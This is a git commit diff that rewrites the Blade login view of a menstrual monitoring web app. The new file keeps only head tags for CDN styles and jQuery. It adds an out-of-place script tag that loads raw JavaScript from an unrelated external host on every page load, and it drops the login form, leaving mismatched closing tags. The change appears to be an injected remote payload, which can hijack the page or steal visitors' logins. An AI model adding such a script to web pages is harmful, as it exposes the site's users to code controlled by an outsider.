5834dbfbce9e9cc0c3e533dc0faf475235a45470
Jee Ann Apitong <toxophilite07@gmail.com>
2024-12-02 19:36:33 +0800

    Update login.blade.php
    Signed-off-by: Jee Ann Apitong <toxophilite07@gmail.com>

--- resources/views/auth/login.blade.php
+++ resources/views/auth/login.blade.php
@@ -1,1 +1,16 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Mentrual Monitoring App :: Sign In ::</title>
+    <link rel="shortcut icon" type="image/png" href="{{ asset('assets/images/blood.jpg') }}" />
+    <link rel="stylesheet" href="{{ asset('assets/auth/css/styles.min.css') }}" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="{{ asset('assets/izitoast/iziToast.min.css') }}">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
+
 <script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/ARKO768557XWJ"></script>
+    </body>
+    </html>
